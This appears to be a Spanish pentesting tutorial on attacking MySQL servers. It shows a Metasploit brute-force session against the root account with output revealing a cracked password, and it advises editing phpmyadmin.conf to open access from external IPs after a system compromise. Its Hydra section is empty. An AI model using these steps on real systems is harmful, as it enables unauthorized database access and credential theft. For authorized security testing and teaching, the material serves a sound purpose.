# MySQL

MySQL es uno de los servicios más importantes a explotar en un pentest, ya que cualquier servidor de base de datos puede tener información sobre la compañía, sobre los clientes, y más importante para nuestro objetivo, puede contener información de acceso a los diferentes sistemas.

Al obtener acceso `root` a un servidor de base de datos, tenemos acceso a todas las credenciales o hashes del sitio web almacenadas en el, además de las del sistema si las hubiera. Un atacante ilegítimo podría modificarlas para bloquear el acceso.

### Fuerza bruta

**Con metasploit:**

Para realizar un ataque de fuerza bruta podemos usar el módulo `mysql_login`. Este módulo realiza fuerza bruta sobre las credenciales de la base de datos. Es necesario proporcionar una lista de contraseñas y un usuario o lista. Una opción interesante es usar el usuario *root* en lugar de una lista.

```bash
msf > use auxiliary/scanner/mysql/mysql_login
msf > set PASS_FILE /path/wordlist.txt
msf > set USERNAME root
msf > run
[+] 192.101.123.3:3306    - 192.101.123.3:3306 - Success: 'root:twinkle'
[*] 192.101.123.3:3306   - Scanned 1 of 1 hosts (100% complete)
[*] 192.101.123.3:3306   - Bruteforce completed, 1 credential was successful.
[*] 192.101.123.3:3306   - You can open an MySQL session with these credentials and CreateSession set to true
[*] Auxiliary module execution completed

```

**Con Hydra:**



### Modificación de archivos

Si previamente hemos obtenido acceso al sistema aprovechando alguna vulnerabilidad como eternalblue, podemos tener acceso a varios archivos interesantes para modificar u obtener información de ellos:

- *wp-config.php*: contiene información de acceso a MySQL. 
- *phpmyadmin.conf*: al modificarlo podemos permitir el acceso desde una dirección IP externa si estuviera bloqueado. En caso de hacerlo es necesario reiniciar el servidor web.

```bash
# wampserver
net stop wampapache
net start wampapache

# IIS
iisreset
```
